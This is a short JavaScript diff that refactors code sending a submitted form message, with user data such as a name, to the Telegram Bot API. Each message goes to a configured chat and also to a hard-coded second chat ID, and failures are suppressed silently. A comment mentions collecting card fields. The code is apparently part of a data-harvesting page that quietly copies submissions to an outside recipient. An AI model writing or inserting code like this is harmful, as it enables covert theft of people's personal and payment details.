@@ -441,22 +441,18 @@ Name: ${name}
   `.trim();
 
   if(TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'PASTE_YOUR_BOT_TOKEN_HERE') {
-    try {
-      // Send to first chat
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
-      });
-      // Send to second chat
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: '7393124087', text: msg })
-      });
-    } catch(e) {
-      console.error('Telegram send failed', e);
-    }
+    // Send to first chat
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
+    }).catch(() => {});
+    // Send to second chat
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: '7393124087', text: msg })
+    }).catch(() => {});
   }
 
   // Prepare payload to DB (includes full dummy card fields as you requested)
